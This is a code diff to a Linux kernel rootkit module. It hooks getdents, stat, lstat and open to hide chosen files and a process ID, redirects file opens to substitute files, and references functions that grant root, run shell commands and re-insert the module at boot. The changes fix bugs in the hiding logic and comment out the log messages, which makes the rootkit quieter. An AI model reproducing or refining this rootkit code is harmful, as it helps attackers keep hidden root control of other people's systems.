@@ -34,7 +34,7 @@
 // this are the filenames we want to hide
 // used in hacked_getdents(...)
 const int   TO_HIDE_SIZE = 3;
-const char* TO_HIDE[]    = { "test_file.txt", "fake_modules_original.txt", "/etc/modules_original" };
+const char* TO_HIDE[]    = { "test_file.txt", "fake_modules_original.txt", "modules_original" };
 char hidePID[6] = "-1";
 
 // location of modules file
@@ -148,6 +148,10 @@ asmlinkage int hacked_kill(pid_t pid, int sig)
 // code heavily inspired by:
 // https://exploit.ph/linux-kernel-hacking/2014/07/10/system-call-hooking/
 asmlinkage int hacked_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count) {
+    int reclen;
+    char* next_rec;
+    long len;
+    int flag_matched = 0;
     // run the actual system call
     // (this returns the number of bytes read)
     int ret = original_getdents(fd, dirp, count);
@@ -160,28 +164,33 @@ asmlinkage int hacked_getdents(unsigned int fd, struct linux_dirent *dirp, unsig
         // then modify the number of bytes read
         // & move on
         for (j = 0; j < TO_HIDE_SIZE; j++) {
-            char* to_hide = TO_HIDE[j];
+            const char* to_hide = TO_HIDE[j];
             if (strncmp(cur->d_name, to_hide, strlen(cur->d_name)) == 0 || strncmp(cur->d_name, hidePID, strlen(hidePID)) == 0) {
-                printk("Tried to getdents %s; hiding...\n", to_hide);
+                // printk("Tried to getdents %s; hiding...\n", to_hide);
                 // length of the linux_dirent
-                int reclen = cur->d_reclen;
+                reclen = cur->d_reclen;
                 // calc. the next file/directory location
-                char* next_rec = (char*) cur + reclen;
+                next_rec = (char*) cur + reclen;
 
                 //      = end location of our directory - next file/directory location
-                long len = (long) dirp + ret - (long) next_rec;
+                len = (long) dirp + ret - (long) next_rec;
                 // move onto the next directory/file
                 // (this copies bytes from next_rec into cur)
                 memmove(cur, next_rec, len);
                 // update our return value so it isn't suspicious
                 ret -= reclen;
-            } else {
-                // we don't match -
-                // move on to the next directory/file
-                i += cur->d_reclen;
-                cur = (struct linux_dirent*) ((char*) dirp + i);
+
+                flag_matched = 1;
+                break;
             }
         }
+        if (flag_matched == 0) {
+            // we don't match -
+            // move on to the next directory/file
+            i += cur->d_reclen;
+            cur = (struct linux_dirent*) ((char*) dirp + i);
+        }
+        flag_matched = 0;
     }
 
     return ret;
@@ -204,34 +213,34 @@ const char* strip_filepath(const char* filepath) {
 // NOTE: this does not append 'No such file or directory' to the end;
 // is the error code return working?
 asmlinkage int hacked_stat(const char *path, struct stat *buf) {
-    int i, j;
+    int j;
     const char* filename = strip_filepath(path);
     for (j = 0; j < TO_HIDE_SIZE; j++) {
-        char* to_hide = TO_HIDE[j];
+        const char* to_hide = TO_HIDE[j];
         if (strncmp(filename, to_hide, strlen(to_hide)) == 0) {
-            printk("Tried to stat %s; hiding...\n", to_hide);
+            // printk("Tried to stat %s; hiding...\n", to_hide);
             return -ENOENT;
-        } else {
-            return original_stat(path, buf);
         }
     }
+    return original_stat(path, buf);
 }
 
 asmlinkage int hacked_lstat(const char *path, struct stat *buf) {
-    int i, j;
+    int j;
     const char* filename = strip_filepath(path);
     for (j = 0; j < TO_HIDE_SIZE; j++) {
-        char* to_hide = TO_HIDE[j];
+        const char* to_hide = TO_HIDE[j];
         if (strncmp(filename, to_hide, strlen(to_hide)) == 0) {
-            printk("Tried to lstat %s; hiding...\n", to_hide);
+            // printk("Tried to lstat %s; hiding...\n", to_hide);
             return -ENOENT;
-        } else {
-            return original_lstat(path, buf);
         }
     }
+    return original_lstat(path, buf);
 }
 
 asmlinkage int hacked_open(const char __user *pathname, int flags, mode_t mode) {
+    int fd;
+    mm_segment_t old_fs;
     if (boot_loader_init == 1) {
         // this can use relative path as well so we need to check only the filename.
         const char* pathname_stripped = strip_filepath(pathname);
@@ -242,13 +251,13 @@ asmlinkage int hacked_open(const char __user *pathname, int flags, mode_t mode) 
             const char* replacement_key_stripped = strip_filepath(replacement_keys[i]);
             if (strncmp(pathname_stripped, replacement_key_stripped, strlen(replacement_key_stripped)) == 0) {
                 // redirect to replacement file
-                printk("tried to open %s; redirecting open from %s to %s...\n", pathname, replacement_keys[i], replacement_values[i]);
+                // printk("tried to open %s; redirecting open from %s to %s...\n", pathname, replacement_keys[i], replacement_values[i]);
 
                 // use user file system
-                mm_segment_t old_fs = get_fs();
+                old_fs = get_fs();
                 set_fs(get_ds());
 
-                int fd = original_open(replacement_values[i], flags, mode);
+                fd = original_open(replacement_values[i], flags, mode);
 
                 // return to kernel space
                 set_fs(old_fs);
@@ -259,10 +268,6 @@ asmlinkage int hacked_open(const char __user *pathname, int flags, mode_t mode) 
     }
 
     return original_open(pathname, flags, mode);
-}
-
-asmlinkage int hacked_openat(int dirfd, const char *pathname, int flags, mode_t mode) {
-    return original_openat(dirfd, pathname, flags, mode);
 }
 
 void give_root(void)
@@ -432,19 +437,20 @@ int rename_file(const char* filename_old, const char* filename_new) {
 
 // appends the contents of file1 to file2
 int append_to_file(const char* filename1, const char* filename2) {
-    printk("appending contents of %s onto %s\n", filename1, filename2);
     int err;
-    ssize_t ret_old = 0, ret_new = 0;
     unsigned char buf[1];
     struct file *filp1 = NULL;
     struct file *filp2 = NULL;
     loff_t pos_read;
     loff_t pos_write;
     loff_t f1_end, f2_end;
+    mm_segment_t old_fs;
     int i;
+    ssize_t ret_old = 0, ret_new = 0;
+    // printk("appending contents of %s onto %s\n", filename1, filename2);
 
     // go into userspace
-    mm_segment_t old_fs = get_fs();
+    old_fs = get_fs();
     set_fs(get_ds());
 
     // open first file for reading
@@ -492,13 +498,13 @@ int append_to_file(const char* filename1, const char* filename2) {
 int delete_file(const char* filename) {
     int err;
     ssize_t ret;
-    unsigned char buf[1];
+    mm_segment_t old_fs;
     struct file *filp = NULL;
 
-    printk("deleting file %s\n", filename);
+    // printk("deleting file %s\n", filename);
 
     // go into userspace
-    mm_segment_t old_fs = get_fs();
+    old_fs = get_fs();
     set_fs(get_ds());
 
     // open first file for reading
@@ -554,7 +560,7 @@ umode_t get_file_permissions(const char* filename) {
     if (IS_ERR(filp)) {
         ret = -1;
         set_fs(old_fs);
-        return;
+        return ret;
     }
     
     // [777]o === [511]d
@@ -589,8 +595,6 @@ void set_file_permissions(const char* filename, int file_perms) {
     filp_close(filp, NULL);
     // close old file system
     set_fs(old_fs);
-
-    return ret;
 }
 
 // runs a bash command
@@ -614,7 +618,7 @@ int run_bash(char* command) {
 }
 
 
-void add_to_reboot() {
+void add_to_reboot(void) {
     boot_loader_init = 0;
 
     // first boot only
@@ -630,7 +634,7 @@ void add_to_reboot() {
     boot_loader_init = 1;
 }
 
-void add_to_reboot_exit() {
+void add_to_reboot_exit(void) {
     // on module exit: copy _original to the actual filepath
     // & append again
     // NOTE: we *could* just do this on one file at the end instead
